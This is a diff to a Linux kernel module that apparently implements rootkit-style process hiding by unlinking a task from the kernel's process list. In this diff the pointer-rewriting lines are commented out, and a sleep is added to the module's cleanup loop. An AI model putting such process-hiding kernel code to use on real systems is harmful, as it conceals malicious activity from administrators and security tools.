@@ -10,6 +10,8 @@
 #include <linux/types.h>
 #include <linux/syscalls.h>
 #include <linux/unistd.h>
+#include <linux/proc_fs.h>
+#include <linux/delay.h>
 
 #include "sysmap.h"
 
@@ -61,13 +63,13 @@ int hide_process(struct task_struct *task, int task_num) {
 	next = list_entry_rcu((task)->tasks.next, struct task_struct, tasks);	
 	prev = list_entry_rcu((task)->tasks.prev, struct task_struct, tasks);	
 	
-	old_prev[task_num] = (task)->tasks.prev;
-	old_next[task_num] = (task)->tasks.next;
+	//old_prev[task_num] = (task)->tasks.prev;
+	//old_next[task_num] = (task)->tasks.next;
 
 	printk(KERN_INFO "Next pid: %d\nPrevious pid: %d\n", next->pid, prev->pid);	
 	
-	(prev)->tasks.next = old_next[task_num];
-	(next)->tasks.prev = old_prev[task_num];
+	//(prev)->tasks.next = old_next[task_num];
+	//(next)->tasks.prev = old_prev[task_num];
 	
 	/* if we reach this point it failed for some reason */
 	return 1;
@@ -170,10 +172,12 @@ void cleanup_module (void)
 	//for_each_process(task) {
 	//	printk(KERN_INFO "%d,", task->pid);
 	//}
-
+	
+	
+	
 	while(call_counter > 0) {
 		/* sleep for some time */
-		// TODO: implement sleep
+		msleep(10);
 	}
 	
 	/* Finally, log the unloading */
